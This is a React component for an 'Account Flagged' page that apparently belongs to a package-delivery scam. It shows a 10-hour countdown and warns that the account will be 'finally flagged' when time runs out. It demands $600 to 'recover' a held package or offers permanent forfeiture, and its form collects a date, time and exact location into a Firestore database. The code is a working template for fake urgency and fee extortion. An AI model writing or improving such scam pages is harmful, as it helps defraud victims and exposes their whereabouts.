import React, { useState, useEffect } from "react";
import "./Errorpage.css";
import { db } from "../components/firebase";
import { collection, addDoc } from "firebase/firestore";

const Errorpage = () => {
  const [showRecover, setShowRecover] = useState(false);
  const [showCancel, setShowCancel] = useState(false);

  const [recoverForm, setRecoverForm] = useState({
    date: "",
    time: "",
    location: "",
  });

  const [cancelForm, setCancelForm] = useState({
    reason: "",
    accept: false,
  });

  // --------------------------------------------
  // ⏳ COUNTDOWN TIMER (10 hours)
  // --------------------------------------------
  const [timeLeft, setTimeLeft] = useState(10 * 60 * 60); // 10 hours in seconds
  const [timerEnded, setTimerEnded] = useState(false);

  useEffect(() => {
    if (timeLeft <= 0) {
      setTimerEnded(true);
      return;
    }

    const interval = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [timeLeft]);

  // Convert seconds to hh:mm:ss
  const formatTime = (seconds) => {
    const h = String(Math.floor(seconds / 3600)).padStart(2, "0");
    const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, "0");
    const s = String(seconds % 60).padStart(2, "0");
    return `${h}:${m}:${s}`;
  };

  // --------------------------------------------

  // 🔹 Submit - Recover
  const handleRecoverSubmit = async (e) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, "recoveries"), recoverForm);
      alert("Recovery request submitted!");
      setShowRecover(false);
    } catch (err) {
      console.error(err);
    }
  };

  // 🔹 Submit - Cancel
  const handleCancelSubmit = async (e) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, "cancellations"), cancelForm);
      alert("Cancellation submitted!");
      setShowCancel(false);
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="error-container">
      <h1 className="error-title">⚠️ Account Flagged</h1>

      <p className="error-message">
        {timerEnded ? (
          <strong>⛔ Account finally flagged.</strong>
        ) : (
          <>
            You have <strong>{formatTime(timeLeft)}</strong> left to pick an option. 
            Your package delivery has been temporarily placed on hold due to extended pickup delay.  
            Please select one of the options below.
          </>
        )}
      </p>

      {!timerEnded && (
        <div className="error-options">
          <div className="option-card">
            <h3>Recover Package</h3>
            <p>Pay <strong>$600</strong> to reactivate your delivery.</p>
            <button className="option-btn recover" onClick={() => setShowRecover(true)}>
              Pay $600
            </button>
          </div>

          <div className="option-card">
            <h3>Cancel Order</h3>
            <p>Cancel and forfeit your package permanently.</p>
            <button className="option-btn cancel" onClick={() => setShowCancel(true)}>
              Cancel Order
            </button>
          </div>
        </div>
      )}

      {/* 🔹 Recover Modal */}
      {showRecover && (
        <div className="modal">
          <div className="modal-content">
            <h2>Recovery Details</h2>
            <form onSubmit={handleRecoverSubmit}>
              <input
                type="date"
                required
                onChange={(e) =>
                  setRecoverForm({ ...recoverForm, date: e.target.value })
                }
              />

              <input
                type="time"
                required
                onChange={(e) =>
                  setRecoverForm({ ...recoverForm, time: e.target.value })
                }
              />

              <input
                type="text"
                placeholder="Exact Location"
                required
                onChange={(e) =>
                  setRecoverForm({ ...recoverForm, location: e.target.value })
                }
              />

              <button type="submit">Submit</button>
              <button type="button" onClick={() => setShowRecover(false)}>
                Close
              </button>
            </form>
          </div>
        </div>
      )}

      {/* 🔹 Cancel Modal */}
      {showCancel && (
        <div className="modal">
          <div className="modal-content">
            <h2>Cancel Order</h2>
            <form onSubmit={handleCancelSubmit}>
              <textarea
                placeholder="Reason for cancellation"
                required
                onChange={(e) =>
                  setCancelForm({ ...cancelForm, reason: e.target.value })
                }
              />

              <label>
                <input
                  type="radio"
                  required
                  onChange={() =>
                    setCancelForm({ ...cancelForm, accept: true })
                  }
                />
                I accept forfeiture of the package
              </label>

              <button type="submit">Confirm Cancel</button>
              <button type="button" onClick={() => setShowCancel(false)}>
                Close
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default Errorpage;